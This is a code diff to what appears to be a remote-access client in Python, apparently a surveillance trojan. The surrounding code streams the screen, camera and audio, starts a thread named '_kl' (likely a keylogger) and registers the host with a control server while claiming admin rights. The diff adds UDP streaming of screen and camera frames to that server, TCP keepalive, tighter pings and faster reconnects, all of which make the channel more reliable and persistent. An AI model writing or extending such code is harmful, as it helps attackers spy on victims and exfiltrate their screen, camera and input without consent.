@@ -100,6 +100,7 @@ _view_mode = "screen"  # 'screen' or 'cam'
 _cam_stream_enabled = False
 _audio_enabled = False
 _last_hid_time = 0.0
+_UDP_AVAILABLE = True
 _audio_queue = deque(maxlen=80)
 _audio_lock = threading.Lock()
 _audio_stream = None
@@ -2055,17 +2056,75 @@ async def main():
 
     threading.Thread(target=_kl, daemon=True).start()
 
+    # --- UDP stream setup ---
+    _udp_transport_send = None
+    _udp_seq = 0
+    _stream_via_udp = _UDP_AVAILABLE and SERVER_IP not in ("127.0.0.1", "localhost")
+    _udp_port_local = 0
+    _last_stream_ts = time.time()
+
+    if _stream_via_udp:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
+            sock.setblocking(False)
+            _udp_transport_send, _ = await asyncio.get_event_loop().create_datagram_endpoint(
+                lambda: asyncio.DatagramProtocol(), sock=sock
+            )
+            _udp_port_local = sock.getsockname()[1]
+            _log(f"UDP stream ready on port {_udp_port_local}")
+        except Exception as ex:
+            _log(f"UDP stream unavailable: {ex}")
+            _stream_via_udp = False
+
+    _STREAM_UDP_PORT = int(os.environ.get("STREAM_PORT", str(int(SERVER_PORT) + 1000)))
+
+    async def _send_udp_frame(frame_type: int, payload: bytes):
+        nonlocal _udp_seq
+        if not _stream_via_udp or not _udp_transport_send:
+            return False
+        try:
+            _udp_seq += 1
+            header = DEVICE_ID.encode("ascii") + struct.pack("<I", _udp_seq) + bytes([frame_type])
+            max_frag = 60000
+            frags = [payload[i:i+max_frag] for i in range(0, len(payload), max_frag)]
+            for idx, frag in enumerate(frags):
+                pkt = header + bytes([len(frags), idx]) + frag
+                _udp_transport_send.sendto(pkt, (SERVER_IP, _STREAM_UDP_PORT))
+            return True
+        except Exception:
+            return False
+
     ws_kw = dict(
-        ping_interval=20,
-        ping_timeout=75,
-        close_timeout=20,
+        ping_interval=10,
+        ping_timeout=45,
+        close_timeout=15,
         max_size=2**25,
+
     )
+
+    # TCP keepalive via raw socket
+    try:
+        import ctypes
+        sock_fileno = None
+    except:
+        pass
 
     while True:
         try:
             _log(f"Connecting to {uri}")
             async with websockets.connect(uri, **ws_kw) as ws:
+                # Enable TCP keepalive
+                try:
+                    tr = ws.transport
+                    if hasattr(tr, "get_extra_info"):
+                        tr_sock = tr.get_extra_info("socket")
+                        if tr_sock:
+                            tr_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                            tr_sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 5000, 3000))
+                except:
+                    pass
+
                 lock_ws = asyncio.Lock()
                 lock_stream = asyncio.Lock()
 
@@ -2074,6 +2133,12 @@ async def main():
                         await ws.send(data)
 
                 async def send_stream(data):
+                    """Try UDP first, fall back to WebSocket."""
+                    if len(data) > 1:
+                        frame_type = data[0]
+                        payload = data[1:]
+                        if frame_type in (0x01, 0x02) and await _send_udp_frame(frame_type, payload):
+                            return
                     async with lock_stream:
                         await ws.send(data)
 
@@ -2081,19 +2146,17 @@ async def main():
                     m = s.monitors[0]
                     res = {"w": m["width"], "h": m["height"]}
 
+                reg_data = {
+                    "id": DEVICE_ID,
+                    "hostname": HOSTNAME,
+                    "os": platform.platform(),
+                    "is_admin": True,
+                    "res": res,
+                }
+                if _stream_via_udp:
+                    reg_data["udp_port"] = _udp_port_local
                 await send_ws(
-                    json.dumps(
-                        {
-                            "cmd": CMD_REG,
-                            "data": {
-                                "id": DEVICE_ID,
-                                "hostname": HOSTNAME,
-                                "os": platform.platform(),
-                                "is_admin": True,
-                                "res": res,
-                            },
-                        }
-                    )
+                    json.dumps({"cmd": CMD_REG, "data": reg_data})
                 )
                 _log("Control channel registered (waiting for server session)...")
                 await asyncio.sleep(0.15)
@@ -2102,16 +2165,16 @@ async def main():
                     lock_cam = asyncio.Lock()
 
                     async def send_cam(data):
+                        if len(data) > 1:
+                            frame_type = data[0]
+                            payload = data[1:]
+                            if frame_type in (0x01, 0x02) and await _send_udp_frame(frame_type, payload):
+                                return
                         async with lock_cam:
                             await cam_ws.send(data)
 
                     await send_cam(
-                        json.dumps(
-                            {
-                                "cmd": CMD_REG,
-                                "data": {"id": DEVICE_ID},
-                            }
-                        )
+                        json.dumps({"cmd": CMD_REG, "data": {"id": DEVICE_ID}})
                     )
                     _log("Registered (control + camera channels).")
                     retry_count = 0
@@ -2593,7 +2656,7 @@ async def main():
         except Exception as ex:
             _log(f"Connection error: {ex}")
 
-        delay = min(3 * (2 ** min(retry_count, 5)), 60)
+        delay = min(2 * (2 ** min(retry_count, 4)), 30)
         _log(f"Retrying in {delay} seconds...")
         await asyncio.sleep(delay)
         retry_count += 1
